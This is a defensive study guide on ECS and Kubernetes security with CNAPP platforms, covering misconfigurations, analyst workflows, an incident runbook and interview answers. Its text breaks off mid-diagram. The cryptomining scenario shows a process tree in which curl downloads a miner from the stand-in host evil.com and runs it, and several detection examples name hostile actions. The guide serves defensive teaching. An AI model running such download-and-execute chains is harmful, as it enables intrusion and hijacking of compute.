---
title: "Comprehensive Container & K8s Security"
date: "2026-05-24"
category: "Container_K8s_Security"
---

# Comprehensive Container & K8s Security

## ECS Container Security CNAPP

# 🐳 ECS & Container Security in CNAPP — Complete Guide

> **Context:** How a Cloud Security Analyst manages AWS ECS (Fargate + EC2) and containers
> using CNAPP platforms like CrowdStrike Falcon, Wiz, and Prisma Cloud.

---

# PART 1: ECS ARCHITECTURE — What You're Protecting

```
ECS DEPLOYMENT MODELS:

┌──────────────────────────────────────────────────────────────────────┐
│                          AWS ECS CLUSTER                              │
│                                                                       │
│   MODEL 1: ECS on EC2 (You manage the host)                         │
│   ┌──────────────────────────────────────────┐                       │
│   │  EC2 Instance (Host)                      │                       │
│   │  ├── ECS Agent (manages tasks)            │                       │
│   │  ├── Docker Daemon                        │                       │
│   │  ├── Falcon Sensor (YOUR security agent)  │  ← Agent-based CWPP  │
│   │  │                                        │                       │
│   │  │  ┌──────────┐  ┌──────────┐           │                       │
│   │  │  │  Task A   │  │  Task B   │          │                       │
│   │  │  │ Container │  │ Container │          │                       │
│   │  │  │ Container │  │ Container │          │                       │
│   │  │  └──────────┘  └──────────┘           │                       │
│   │  └────────────────────────────────────────│                       │
│   └──────────────────────────────────────────┘                       │
│                                                                       │
│   MODEL 2: ECS on Fargate (AWS manages the host — serverless)        │
│   ┌──────────────────┐  ┌──────────────────┐                         │
│   │  Fargate Task A   │  │  Fargate Task B   │                        │
│   │  ┌──────────────┐ │  │  ┌──────────────┐ │                        │
│   │  │  Container 1  │ │  │  │  Container 1  │ │  ← No host access   │
│   │  │  Container 2  │ │  │  │  Container 2  │ │  ← Agentless OR     │
│   │  └──────────────┘ │  │  └──────────────┘ │ │     sidecar sensor  │
│   └──────────────────┘  └──────────────────┘                         │
│                                                                       │
│   SERVICE: Runs N desired tasks, handles scaling, load balancing      │
│   TASK DEFINITION: Blueprint (image, CPU, memory, IAM role, ports)    │
│   TASK: Running instance of a Task Definition                         │
│   CONTAINER: A single Docker container inside a Task                  │
└──────────────────────────────────────────────────────────────────────┘
```

### Key Difference for Security:

| Aspect | ECS on EC2 | ECS on Fargate |
|--------|-----------|----------------|
| **Host visibility** | Full — you own the EC2 | None — AWS manages host |
| **Sensor deployment** | Install Falcon agent on EC2 (like any Linux host) | Sidecar container or agentless snapshot scanning |
| **Runtime detection** | Full eBPF-based process/network/file monitoring | Limited without sidecar; agentless = periodic scan |
| **Patching** | You patch the EC2 AMI + container images | You patch container images only; AWS patches host |
| **Privileged access** | Possible (and risky) | Blocked by design — Fargate doesn't allow privileged |

---

# PART 2: CNAPP COVERAGE FOR ECS — What the Platform Sees

## 2.1 Asset Discovery & Inventory

```
WHAT CNAPP DISCOVERS AUTOMATICALLY:

When you register your AWS account in the CNAPP tool:

├── ECS Clusters
│   ├── Cluster Name, Region, Account ID
│   ├── Launch Type (EC2 vs Fargate)
│   └── Number of Services, Tasks, Containers
│
├── ECS Services
│   ├── Service Name, Desired Count, Running Count
│   ├── Load Balancer attached?
│   ├── Auto-scaling policies
│   └── Deployment configuration
│
├── Task Definitions
│   ├── Family, Revision Number
│   ├── Container Images used (registry + tag)
│   ├── IAM Task Role (what permissions does this task have?)
│   ├── IAM Task Execution Role (what can ECS agent do?)
│   ├── Network Mode (awsvpc, bridge, host)
│   ├── Logging configuration (CloudWatch, FireLens)
│   └── Secrets / Environment Variables
│
├── Running Tasks
│   ├── Task ARN, Status, Started At
│   ├── Container Instance (if EC2 launch type)
│   ├── ENI / Private IP (if awsvpc mode)
│   └── Each container's image digest, status, health
│
└── Container Images
    ├── Image URI (e.g., 123456.dkr.ecr.us-east-1.amazonaws.com/app:v2.1)
    ├── Scan Results (CVEs, malware, secrets, misconfigs)
    ├── Base image lineage
    └── Running vs Registry-only status
```

## 2.2 The Five Security Pillars for ECS in CNAPP

```
┌─────────────────────────────────────────────────────────────────┐
│                ECS SECURITY IN CNAPP — 5 PILLARS                 │
│                                                                   │
│   ┌────────────┐  ┌────────────┐  ┌────────────┐               │
│   │ 1. IMAGE    │  │ 2. CONFIG  │  │ 3. RUNTIME │               │
│   │ SCANNING    │  │ POSTURE    │  │ PROTECTION │               │
│   │ (Pre-deploy)│  │ (CSPM)     │  │ (CWPP)     │               │
│   └─────┬──────┘  └─────┬──────┘  └─────┬──────┘               │
│         │                │                │                       │
│   ┌─────▼──────┐  ┌─────▼──────┐                               │
│   │ 4. IDENTITY│  │ 5. NETWORK │                               │
│   │ (CIEM)     │  │ VISIBILITY │                               │
│   └────────────┘  └────────────┘                               │
└─────────────────────────────────────────────────────────────────┘
```

---

# PART 3: PILLAR BY PILLAR — How You Manage ECS Security

## 3.1 IMAGE SCANNING (Shift-Left + Continuous)

```
WHERE IN TOOL:
├── CrowdStrike: Vulnerabilities → Image Assessments
├── Wiz: Vulnerabilities → Container Images
├── Prisma: Compute → Images

WHAT IT SCANS:
├── OS packages (apt/yum)              → CVEs from NVD
├── Application libraries (npm/pip/go) → CVEs + license issues
├── Secrets in layers                  → hardcoded API keys, passwords
├── Malware                            → known malicious binaries
├── Dockerfile misconfigs              → USER root, no HEALTHCHECK
└── Base image freshness               → outdated base? known vuln?

TWO SCANNING POINTS:

  1. ECR REGISTRY SCANNING (at rest):
     ├── CNAPP connects to your ECR registry
     ├── Scans every image on push (or scheduled)
     ├── Flags: 12 Critical CVEs in nginx:1.19 base image
     └── Action: Block deployment via CI/CD gate or admission policy

  2. RUNTIME IMAGE ASSESSMENT (in production):
     ├── CNAPP checks RUNNING tasks/containers
     ├── Compares: "image used in production" vs "scan results"
     ├── Flags: Task abc123 is running image with CVE-2024-XXXX
     └── Priority: Running + Critical + Internet-facing = IMMEDIATE
```

### 🔧 YOUR DAILY WORKFLOW — Image Scanning

```
MORNING CHECK:
1. Open CNAPP → Image Assessments → Filter: Severity = Critical, Status = Running
2. For each Critical image:
   ├── Is a patched version available? → YES → Create ticket for image rebuild
   ├── Is the CVE actively exploited (CISA KEV)? → YES → Emergency SLA (4 hours)
   ├── Is the task internet-facing (behind ALB)? → YES → Escalate priority
   └── No patch available? → Apply compensating control (WAF rule, restrict SG)

3. Track in ServiceNow:
   ├── Ticket: "Rebuild nginx image to patch CVE-2024-XXXX"
   ├── Owner: Application team (from CMDB)
   ├── SLA: 24 hours (Critical, internal)
   └── Verify: After rebuild, confirm new image scans clean
```

## 3.2 CONFIGURATION POSTURE (CSPM for ECS)

### Common ECS Misconfigurations the CNAPP Detects:

| # | Misconfiguration (IOM) | Severity | CIS/NIST Mapping | Remediation |
|---|----------------------|----------|-------------------|-------------|
| 1 | **Task Definition uses `privileged: true`** | 🔴 Critical | CIS ECS 5.4 | Remove `privileged` flag. Use specific Linux capabilities instead. |
| 2 | **Task Role has `*:*` (admin) permissions** | 🔴 Critical | AC-6 (Least Privilege) | Scope IAM policy to specific actions and resources. |
| 3 | **No logging configured** (no CloudWatch/FireLens) | 🟠 High | AU-2, AU-12 | Add `logConfiguration` in task def with `awslogs` driver. |
| 4 | **Secrets passed as environment variables** | 🟠 High | SC-28 | Use AWS Secrets Manager or SSM Parameter Store with `secrets` block. |
| 5 | **Container running as root (`user: root`)** | 🟠 High | CIS ECS 5.9 | Set `user` to non-root UID in task definition or Dockerfile. |
| 6 | **`readonlyRootFilesystem` not enabled** | 🟡 Medium | CM-7 | Set `readonlyRootFilesystem: true` in container definition. |
| 7 | **ECS Exec enabled on production service** | 🟡 Medium | AC-17 | Disable `executeCommandConfiguration` in prod (enable in dev only). |
| 8 | **Bridge network mode used (not awsvpc)** | 🟡 Medium | SC-7 | Switch to `awsvpc` for per-task ENI and Security Group isolation. |
| 9 | **No resource limits (CPU/memory not set)** | 🟡 Medium | CM-6 | Set `cpu` and `memory` in task definition to prevent noisy-neighbor. |
| 10 | **ECR image scanning not enabled** | 🟡 Medium | RA-5 | Enable `ScanOnPush` in ECR repository settings. |
| 11 | **Task Execution Role too permissive** | 🟠 High | AC-6 | Restrict to `ecr:GetAuthorizationToken`, `logs:CreateLogStream` only. |
| 12 | **No VPC endpoint for ECR (pulling over internet)** | 🟡 Medium | SC-7 | Create VPC endpoints for `ecr.api`, `ecr.dkr`, and `s3`. |

### 🔧 YOUR WEEKLY WORKFLOW — Posture Review

```
EVERY MONDAY:
1. Open CNAPP → CSPM → Filter: Service = ECS, Severity = Critical + High
2. Review new IOMs since last week
3. For each:
   ├── Validate: Is this a true misconfiguration? (check task def in console)
   ├── Assign: Route to the team that owns the ECS service (via CMDB)
   ├── SLA: Critical = 24h, High = 48h, Medium = 7 days
   └── Track: Create/update ServiceNow ticket
4. Update Power BI dashboard with ECS-specific posture metrics
```

## 3.3 RUNTIME PROTECTION (CWPP for ECS)

```
HOW CWPP WORKS ON ECS:

ECS on EC2:
├── Falcon sensor installed on the EC2 host (same as any Linux machine)
├── eBPF hooks intercept ALL system calls across ALL containers on that host
├── The sensor sees every process, file write, and network connection
├── Detection examples:
│   ├── Container spawns /bin/bash → "InteractiveContainerSession"
│   ├── curl downloads binary to /tmp → "ContainerDrift.NewExecutable"
│   ├── Process connects to known C2 IP → "SuspiciousNetworkConnection"
│   └── Container reads /proc/1/cgroup → "ContainerEscapeAttempt"

ECS on Fargate:
├── NO host access → cannot install traditional agent
├── OPTIONS:
│   ├── Option A: Sidecar Container
│   │   ├── Add Falcon sensor as a sidecar container in the Task Definition
│   │   ├── Shares PID namespace with application container
│   │   ├── Provides runtime visibility similar to EC2 mode
│   │   └── Trade-off: adds ~50MB memory overhead per task
│   │
│   ├── Option B: Agentless Snapshot Scanning
│   │   ├── CNAPP takes periodic snapshots of the Fargate task's filesystem
│   │   ├── Scans for vulnerabilities, malware, secrets
│   │   ├── No runtime behavioral detection (no process trees)
│   │   └── Trade-off: periodic (not real-time), no live threat detection
│   │
│   └── Option C: Cloud-Native Detection (GuardDuty ECS Runtime Monitoring)
│       ├── AWS GuardDuty has native ECS runtime monitoring (2024+)
│       ├── AWS manages a sidecar agent automatically
│       ├── Detects: crypto mining, malware, privilege escalation
│       └── Findings flow into Security Hub → your CNAPP ingests them
```

### 🔧 INCIDENT SCENARIO — Compromised ECS Task

```
SCENARIO: CNAPP fires a "CryptominingActivity" alert on an ECS task.

STEP 1: IDENTIFY (0-5 min)
├── Open CNAPP → Detections → filter by ECS cluster
├── Alert: Task arn:aws:ecs:us-east-1:123:task/prod-cluster/abc123
├── Process tree: java → /bin/sh → curl http://evil.com/miner → ./xmrig
├── This is a web application container that should NOT run shell or curl
└── Verdict: TRUE POSITIVE

STEP 2: CONTAIN (5-15 min)
├── Stop the task:
│   aws ecs stop-task --cluster prod-cluster --task abc123 \
│     --reason "Security: cryptomining detected"
├── Scale down the service temporarily:
│   aws ecs update-service --cluster prod-cluster \
│     --service web-app --desired-count 0
├── Restrict the Security Group (if awsvpc mode):
│   aws ec2 revoke-security-group-egress --group-id sg-xxx \
│     --ip-permissions IpProtocol=-1,IpRanges=[{CidrIp=0.0.0.0/0}]
└── If EC2 launch type: also cordon the EC2 instance

STEP 3: INVESTIGATE (15-60 min)
├── How did attacker get in?
│   ├── Check: Was the container image itself compromised? (supply chain)
│   ├── Check: Was there an application vulnerability? (RCE in Java app)
│   ├── Check: Was the Task Role credential stolen? (check CloudTrail)
│   └── Check: Was ECS Exec used to get a shell? (CloudTrail: ExecuteCommand)
├── What did the attacker do?
│   ├── Check: Network connections (was data exfiltrated?)
│   ├── Check: CloudTrail for API calls using the Task Role
│   └── Check: Did they access other AWS services (S3, SecretsManager)?

STEP 4: ERADICATE
├── If supply chain: remove malicious image, scan all images in ECR
├── If app vuln: patch the vulnerability, rebuild image
├── Rotate all secrets the task had access to
├── Rotate the Task Role credentials (update trust policy)
└── Update ECR scan policy to scan on every push

STEP 5: RECOVER
├── Deploy clean image version
├── Scale service back to desired count
├── Monitor closely for 72 hours
└── Verify Falcon sensor / GuardDuty coverage on all tasks

STEP 6: POST-INCIDENT
├── Was ECS Exec enabled in production? → DISABLE IT
├── Was the Task Role overly permissive? → SCOPE IT DOWN
├── Were image scans catching the malicious layer? → TUNE SCANNING
├── Add KPI: "ECS tasks with admin-level Task Roles" → TRACK IT
└── Write incident report, update runbook
```

## 3.4 IDENTITY (CIEM for ECS)

```
ECS IAM MODEL:

┌──────────────────────────────────────────────────────┐
│  Task Definition                                       │
│                                                        │
│  Task Execution Role ──► WHAT ECS AGENT CAN DO:       │
│  │ • Pull image from ECR                               │
│  │ • Send logs to CloudWatch                           │
│  │ • Fetch secrets from SSM/SecretsManager             │
│  │ ⚠️ Should be narrow (read-only for secrets + ECR)   │
│  │                                                     │
│  Task Role ──► WHAT YOUR APPLICATION CODE CAN DO:     │
│  │ • Access S3 buckets                                 │
│  │ • Read DynamoDB tables                              │
│  │ • Call other AWS APIs                               │
│  │ ⚠️ This is what attackers steal! Must be least priv │
│  │                                                     │
│  ⚠️ COMMON MISTAKE:                                    │
│  │ Giving the Task Role "AdministratorAccess"          │
│  │ because "it was easier during dev."                  │
│  │ → CIEM catches this and flags it as CRITICAL        │
└──────────────────────────────────────────────────────┘

CIEM CHECKS FOR ECS:
├── Task Role has unused permissions? → OVERPRIVILEGED → Recommend scoped policy
├── Task Role can assume other roles? → LATERAL MOVEMENT RISK → Flag
├── Task Role can access sensitive S3? → DATA EXPOSURE → Validate business need
├── Execution Role can read ALL secrets? → SECRET EXPOSURE → Scope to specific ARNs
└── Multiple services share the same Task Role? → BLAST RADIUS → Isolate per-service
```

## 3.5 NETWORK VISIBILITY

```
CNAPP NETWORK VIEW FOR ECS:

┌─────────────────────────────────────────────────────────────┐
│                    ECS NETWORK MAP                            │
│                                                               │
│   Internet                                                    │
│      │                                                        │
│      ▼                                                        │
│   ┌─────────┐    ┌─────────────────────────────┐             │
│   │   ALB   │───►│  ECS Service: web-frontend   │             │
│   └─────────┘    │  SG: allow 443 from ALB only  │             │
│                  └──────────┬────────────────────┘             │
│                             │ port 8080                       │
│                  ┌──────────▼────────────────────┐             │
│                  │  ECS Service: api-backend      │             │
│                  │  SG: allow 8080 from frontend  │             │
│                  └──────────┬────────────────────┘             │
│                             │ port 5432                       │
│                  ┌──────────▼────────────────────┐             │
│                  │  RDS PostgreSQL                 │             │
│                  │  SG: allow 5432 from backend    │             │
│                  └────────────────────────────────┘             │
│                                                               │
│   CNAPP SHOWS:                                                │
│   ├── Which tasks are internet-facing (behind ALB/NLB)        │
│   ├── Which tasks communicate internally (east-west traffic)  │
│   ├── Unexpected connections (task → unknown external IP)      │
│   └── Tasks with SG allowing 0.0.0.0/0 egress (data exfil)   │
└─────────────────────────────────────────────────────────────┘
```

---

# PART 4: ECS vs EKS — CNAPP Comparison

| Aspect | ECS | EKS (Kubernetes) |
|--------|-----|-----------------|
| **Admission Control** | No native equivalent; use CI/CD gates + IAM | KAC / OPA Gatekeeper |
| **Pod Security Standards** | N/A — controlled via Task Definition | PSS via namespace labels |
| **Runtime Agent** | Falcon on EC2 host / sidecar on Fargate | DaemonSet on all nodes |
| **Network Policy** | Security Groups per task (awsvpc mode) | Kubernetes NetworkPolicies + SGs |
| **RBAC** | IAM Task Roles | Kubernetes RBAC + IAM (IRSA) |
| **Image Gating** | ECR scan-on-push + CI/CD pipeline block | KAC image assessment policy |
| **Drift Detection** | Agent-based (EC2) or agentless (Fargate) | eBPF DaemonSet on every node |
| **CSPM Coverage** | ✅ Full (API-based) | ✅ Full (API + K8s API) |
| **CIEM Coverage** | Task Role + Execution Role analysis | IRSA + ServiceAccount analysis |

---

# PART 5: INTERVIEW ANSWERS FOR ECS + CNAPP

### Q: "How do you secure ECS services using CNAPP?"

> "I apply a five-pillar approach. **First, Image Scanning** — every image pushed to ECR is scanned for CVEs, secrets, and malware. Critical findings block deployment via CI/CD. **Second, Configuration Posture** — CSPM continuously audits task definitions for misconfigurations like privileged mode, root user, missing logging, or overly permissive IAM roles. **Third, Runtime Protection** — on EC2 launch type, the Falcon sensor monitors all container processes via eBPF; on Fargate, we use a sidecar sensor or GuardDuty ECS Runtime Monitoring. **Fourth, Identity** — CIEM analyzes Task Roles and Execution Roles for least privilege violations and lateral movement risks. **Fifth, Network** — we map all east-west and north-south traffic to detect unexpected connections or exfiltration patterns."

### Q: "How do you handle ECS on Fargate where you can't install an agent?"

> "Fargate is serverless — you don't own the host, so traditional DaemonSet agents don't apply. I use three complementary approaches: **One**, sidecar sensor — add the CrowdStrike Falcon container as a sidecar in the Task Definition sharing the PID namespace for runtime visibility. **Two**, agentless scanning — the CNAPP takes periodic filesystem snapshots to detect vulnerabilities and secrets without any agent. **Three**, AWS GuardDuty ECS Runtime Monitoring — since 2024, GuardDuty provides native Fargate runtime detection via an AWS-managed sidecar. The combination gives us vulnerability visibility (agentless), behavioral detection (sidecar or GuardDuty), and posture compliance (CSPM via API)."

### Q: "A Critical CVE is found in a running ECS production task. Walk me through your response."

> "**Hour 0-1:** I verify the CVE — is there a public exploit? Is the task internet-facing? Is the Task Role sensitive? If all three are yes, this is a P1. **Hour 1-4:** I check ECR for a patched image version. If available, I coordinate with the app team to deploy the updated task definition. ECS performs a rolling update — new tasks spin up with the clean image, old tasks drain. Zero downtime. **If no patch exists:** I apply compensating controls — restrict the ECS Security Group, add a WAF rule if it's behind an ALB, or reduce the Task Role permissions to limit blast radius. **Post-fix:** I verify the new tasks are running the patched image, close the ServiceNow ticket, and update our vulnerability dashboard."


---

## EKS K8s Security CNAPP

# ☸️ EKS & Self-Managed Kubernetes Security in CNAPP — Complete Guide

> **Context:** How a Cloud Security Analyst manages AWS EKS, AKS, GKE, and self-managed
> Kubernetes clusters using CNAPP platforms like CrowdStrike Falcon, Wiz, and Prisma Cloud.

---

# PART 1: KUBERNETES ARCHITECTURE — What You're Protecting

```
KUBERNETES DEPLOYMENT MODELS:

┌──────────────────────────────────────────────────────────────────────────┐
│                                                                          │
│   MODEL 1: MANAGED K8S (EKS / AKS / GKE)                               │
│   ┌──────────────────────────────────────────────────────────┐          │
│   │  CONTROL PLANE (Managed by Cloud Provider)                │          │
│   │  ├── kube-apiserver       ← Cloud provider patches this  │          │
│   │  ├── etcd (secrets store) ← You never touch this         │          │
│   │  ├── kube-scheduler                                       │          │
│   │  └── cloud-controller-manager                             │          │
│   └──────────────────────────┬───────────────────────────────┘          │
│                               │                                          │
│   ┌──────────────────────────▼───────────────────────────────┐          │
│   │  DATA PLANE (Worker Nodes — YOU manage these)             │          │
│   │                                                            │          │
│   │  Node 1 (EC2 / VM)           Node 2 (EC2 / VM)           │          │
│   │  ├── kubelet                  ├── kubelet                 │          │
│   │  ├── kube-proxy               ├── kube-proxy              │          │
│   │  ├── Container Runtime        ├── Container Runtime       │          │
│   │  ├── 🛡️ Falcon Sensor        ├── 🛡️ Falcon Sensor       │  ← YOUR │
│   │  │   (DaemonSet)              │   (DaemonSet)             │    AGENT │
│   │  │                            │                           │          │
│   │  │  ┌─────┐ ┌─────┐          │  ┌─────┐ ┌─────┐        │          │
│   │  │  │Pod A│ │Pod B│          │  │Pod C│ │Pod D│        │          │
│   │  │  └─────┘ └─────┘          │  └─────┘ └─────┘        │          │
│   │  └────────────────────────────┘───────────────────────────│          │
│   └──────────────────────────────────────────────────────────┘          │
│                                                                          │
│   MODEL 2: SELF-MANAGED K8S (kubeadm / RKE / k3s)                      │
│   ┌──────────────────────────────────────────────────────────┐          │
│   │  CONTROL PLANE (YOU manage this too)                      │          │
│   │  ├── kube-apiserver   ← YOU patch, harden, backup        │          │
│   │  ├── etcd             ← YOU encrypt, backup, repair      │          │
│   │  ├── kube-scheduler   ← YOU configure admission plugins  │          │
│   │  └── EVERYTHING is your responsibility                    │          │
│   └──────────────────────┬───────────────────────────────────┘          │
│                           │                                              │
│   │  Data Plane: Same as above — nodes, kubelet, pods, sensor          │
│   └────────────────────────────────────────────────────────────         │
│                                                                          │
│   MODEL 3: MANAGED NODE POOLS (EKS Fargate / GKE Autopilot)            │
│   ├── Cloud provider manages BOTH control plane AND nodes               │
│   ├── You only define pod specs                                          │
│   ├── No DaemonSet allowed (Fargate) → sidecar or agentless             │
│   └── GKE Autopilot allows DaemonSets with restrictions                 │
└──────────────────────────────────────────────────────────────────────────┘
```

### Security Responsibility Matrix

| Component | EKS / AKS / GKE | Self-Managed K8s |
|-----------|-----------------|-----------------|
| **API Server patching** | Cloud provider | ⚠️ YOU |
| **etcd encryption** | Cloud provider (at rest) | ⚠️ YOU (must configure) |
| **Node OS patching** | YOU (AMI updates) | ⚠️ YOU (full OS lifecycle) |
| **Container runtime** | YOU (containerd version) | ⚠️ YOU |
| **RBAC configuration** | YOU | YOU |
| **Network policies** | YOU | YOU |
| **Pod Security Standards** | YOU | YOU |
| **Admission Controllers** | YOU (KAC / OPA) | YOU + also manage webhook infra |
| **Sensor deployment** | YOU (DaemonSet) | YOU (DaemonSet) |
| **Certificate rotation** | Cloud provider | ⚠️ YOU |
| **etcd backup** | Cloud provider | ⚠️ YOU (critical!) |

---

# PART 2: CNAPP COVERAGE FOR K8S — What the Platform Sees

## 2.1 Asset Discovery & Inventory

```
WHAT CNAPP AUTO-DISCOVERS WHEN YOU CONNECT A K8S CLUSTER:

├── Cluster Metadata
│   ├── Cluster name, K8s version, region, provider (EKS/AKS/GKE/self-managed)
│   ├── API server endpoint, authentication mode
│   ├── Add-ons enabled (CoreDNS, kube-proxy, CNI plugin)
│   └── ⚠️ Outdated K8s version? → IOM: "Cluster running unsupported K8s version"
│
├── Nodes
│   ├── Node name, instance type, OS, kernel version
│   ├── Falcon sensor status: Installed? Version? Connected?
│   ├── Kubelet configuration (anonymous auth, read-only port)
│   └── ⚠️ Coverage gap: Node without sensor → CRITICAL alert
│
├── Namespaces
│   ├── Name, labels, annotations
│   ├── Pod Security Admission (PSA) labels (enforce/audit/warn)
│   ├── ResourceQuotas and LimitRanges
│   └── ⚠️ No PSA label? → IOM: "Namespace lacks security enforcement"
│
├── Workloads (Deployments, StatefulSets, DaemonSets, Jobs, CronJobs)
│   ├── Name, namespace, replicas, image(s), labels
│   ├── SecurityContext settings per container
│   ├── Volume mounts (hostPath! secrets! configmaps!)
│   └── ServiceAccount and its bound roles
│
├── Pods (Running)
│   ├── Pod name, namespace, node, IP, phase
│   ├── Container images (with digest), init containers
│   ├── Security context (privileged? root? capabilities?)
│   └── Network connections (east-west, north-south)
│
├── RBAC
│   ├── ClusterRoles, ClusterRoleBindings
│   ├── Roles, RoleBindings (per namespace)
│   ├── ServiceAccounts and their bound permissions
│   └── ⚠️ ClusterRoleBinding with `cluster-admin` to ServiceAccount → CRITICAL
│
├── NetworkPolicies
│   ├── Which namespaces have them? Which don't?
│   └── ⚠️ Namespace with no NetworkPolicy → IOM: "No network segmentation"
│
├── Secrets
│   ├── Type (Opaque, TLS, dockerconfigjson)
│   ├── Which pods mount which secrets?
│   └── ⚠️ Default ServiceAccount token auto-mounted? → IOM
│
└── Container Images
    ├── All images running in the cluster
    ├── CVE scan results per image
    ├── Image provenance (which registry? signed?)
    └── ⚠️ Image from public Docker Hub in production? → IOM
```

## 2.2 The Six Security Pillars for K8s in CNAPP

```
┌────────────────────────────────────────────────────────────────────┐
│              KUBERNETES SECURITY IN CNAPP — 6 PILLARS               │
│                                                                      │
│  ┌───────────┐  ┌───────────┐  ┌───────────┐  ┌───────────┐       │
│  │ 1. IMAGE   │  │ 2. CONFIG │  │ 3. RUNTIME│  │ 4. ADMIS- │       │
│  │ SCANNING   │  │ POSTURE   │  │ PROTECT.  │  │ SION CTRL │       │
│  │            │  │ (CSPM)    │  │ (CWPP)    │  │ (KAC/OPA) │       │
│  └─────┬─────┘  └─────┬─────┘  └─────┬─────┘  └─────┬─────┘       │
│        │               │               │               │             │
│        │        ┌──────▼──────┐  ┌─────▼─────┐                      │
│        │        │ 5. IDENTITY │  │ 6. NETWORK│                      │
│        │        │ (CIEM/RBAC) │  │ VISIBILITY│                      │
│        │        └─────────────┘  └───────────┘                      │
└────────────────────────────────────────────────────────────────────┘
```

---

# PART 3: PILLAR BY PILLAR — How You Manage K8s Security

## 3.1 IMAGE SCANNING

```
SCANNING PIPELINE FOR KUBERNETES:

  Developer → git push → CI Pipeline
                            │
              ┌─────────────▼──────────────┐
              │ STAGE 1: Build Image         │
              │ docker build -t app:v2.1 .   │
              └─────────────┬──────────────┘
                            │
              ┌─────────────▼──────────────┐
              │ STAGE 2: Scan Image          │
              │ • Falcon Image Assessment    │
              │ • OR trivy image app:v2.1    │
              │ • OR snyk container test     │
              │                              │
              │ RESULTS:                     │
              │ Critical: 3 CVEs             │
              │ High: 7 CVEs                 │
              │ Secrets: 0                   │
              │ Malware: 0                   │
              │                              │
              │ GATE: Critical > 0? → ❌ FAIL │
              └─────────────┬──────────────┘
                            │ PASS
              ┌─────────────▼──────────────┐
              │ STAGE 3: Push to Registry    │
              │ docker push ECR/ACR/GCR      │
              └─────────────┬──────────────┘
                            │
              ┌─────────────▼──────────────┐
              │ STAGE 4: Deploy to K8s       │
              │ kubectl apply / helm install │
              │                              │
              │ 🛡️ KAC INTERCEPTS:           │
              │ • Is image scanned? ✅        │
              │ • Any Critical CVEs? ❌ BLOCK │
              │ • From approved registry? ✅  │
              │ • Signed? ✅                  │
              └──────────────────────────────┘

  RUNTIME CONTINUOUS SCANNING:
  ├── CNAPP re-scans all running images every 24 hours
  ├── New CVE published? → existing running images are re-evaluated
  ├── Alert: "Pod payments/checkout is running image with CVE-2024-XXXX
  │           (Critical, public exploit, CISA KEV) — detected 2 hours ago"
  └── This triggers your vulnerability management lifecycle
```

## 3.2 CONFIGURATION POSTURE (CSPM for Kubernetes)

### Common K8s Misconfigurations the CNAPP Detects

| # | Misconfiguration (IOM) | Severity | CIS Benchmark | Remediation |
|---|----------------------|----------|---------------|-------------|
| 1 | **Pod running as `privileged: true`** | 🔴 Critical | CIS 5.2.1 | Remove privileged flag. Use specific capabilities. |
| 2 | **Pod running as root (`runAsNonRoot: false`)** | 🔴 Critical | CIS 5.2.9 | Set `runAsNonRoot: true` + `runAsUser: 1000` in securityContext. |
| 3 | **ServiceAccount token auto-mounted** | 🟠 High | CIS 5.1.6 | Set `automountServiceAccountToken: false` on pods that don't need K8s API access. |
| 4 | **ClusterRoleBinding grants `cluster-admin` to ServiceAccount** | 🔴 Critical | CIS 4.2.1 | Replace with namespace-scoped Role + least-privilege verbs. |
| 5 | **hostPath volume mounted** | 🔴 Critical | CIS 5.2.13 | Use PersistentVolumeClaims or emptyDir instead. |
| 6 | **hostNetwork: true** | 🔴 Critical | CIS 5.2.3 | Remove hostNetwork. Use Services + Ingress for networking. |
| 7 | **hostPID: true** | 🔴 Critical | CIS 5.2.2 | Remove hostPID. Only system components (Falcon sensor) need this. |
| 8 | **No seccomp profile** | 🟠 High | CIS 5.7.2 | Add `seccompProfile: { type: RuntimeDefault }` to securityContext. |
| 9 | **Containers with ALL capabilities** | 🟠 High | CIS 5.2.8 | Set `drop: ["ALL"]` and add only needed caps (e.g., NET_BIND_SERVICE). |
| 10 | **readOnlyRootFilesystem not set** | 🟡 Medium | CIS 5.2.10 | Set `readOnlyRootFilesystem: true`. Use emptyDir for writable dirs. |
| 11 | **No resource limits (CPU/memory)** | 🟡 Medium | CIS 5.4.1 | Set `resources.limits` and `resources.requests` on every container. |
| 12 | **Namespace has no NetworkPolicy** | 🟠 High | CIS 5.3.2 | Apply default-deny ingress/egress + allow specific flows. |
| 13 | **Namespace has no PSA labels** | 🟠 High | N/A (1.25+) | Add `pod-security.kubernetes.io/enforce: baseline` label. |
| 14 | **Image pulled from public Docker Hub** | 🟡 Medium | CIS 5.1.1 | Mirror to private ECR/ACR/GCR. Enforce registry allowlist via KAC. |
| 15 | **Kubelet anonymous auth enabled** | 🔴 Critical | CIS 3.2.1 | Set `--anonymous-auth=false` in kubelet config. |
| 16 | **Tiller (Helm v2) running in cluster** | 🔴 Critical | Deprecated | Upgrade to Helm v3 (no Tiller). Remove Tiller deployment. |
| 17 | **Default namespace used for workloads** | 🟡 Medium | CIS 5.7.1 | Create dedicated namespaces per team/app. Enforce via OPA/KAC. |
| 18 | **Secrets stored as env vars (not volumes)** | 🟡 Medium | CIS 5.4.1 | Mount secrets as volumes. Use External Secrets Operator for vault integration. |
| 19 | **RBAC wildcard permissions (`*:*`)** | 🔴 Critical | CIS 4.1.3 | Replace with specific resource + verb combinations. |
| 20 | **etcd not encrypted at rest** (self-managed) | 🔴 Critical | CIS 1.2.29 | Configure EncryptionConfiguration with aescbc or kms provider. |

### 🔧 YOUR WEEKLY POSTURE WORKFLOW

```
EVERY MONDAY:
1. Open CNAPP → CSPM → Filter: Resource Type = Kubernetes, Severity ≥ High
2. Group by: Cluster → Namespace → Workload
3. For each Critical/High IOM:
   ├── Who owns this namespace? (check namespace labels / CMDB)
   ├── Is this in production? (namespace label: env=production)
   ├── Create ServiceNow ticket with:
   │   ├── Exact YAML fix (securityContext block to add)
   │   ├── CIS benchmark reference
   │   └── SLA: Critical=24h, High=48h
   └── Track in weekly SLA dashboard, report to team leads
4. Check PSA label compliance:
   ├── How many namespaces have no PSA labels?
   ├── Target: 100% of production namespaces have at least `baseline`
   └── Report exceptions to governance
```

## 3.3 RUNTIME PROTECTION (CWPP via DaemonSet)

### How the Falcon Sensor DaemonSet Works

```
FALCON SENSOR DEPLOYMENT ON KUBERNETES:

┌─────────────────────────────────────────────────────────────────┐
│  KUBERNETES CLUSTER                                               │
│                                                                    │
│  Node 1                              Node 2                       │
│  ┌────────────────────────────┐     ┌────────────────────────────┐│
│  │ falcon-sensor (DaemonSet)  │     │ falcon-sensor (DaemonSet)  ││
│  │ ├── Runs as privileged     │     │ ├── Runs as privileged     ││
│  │ ├── Mounts /proc, /sys     │     │ ├── Mounts /proc, /sys     ││
│  │ ├── Uses eBPF hooks        │     │ ├── Uses eBPF hooks        ││
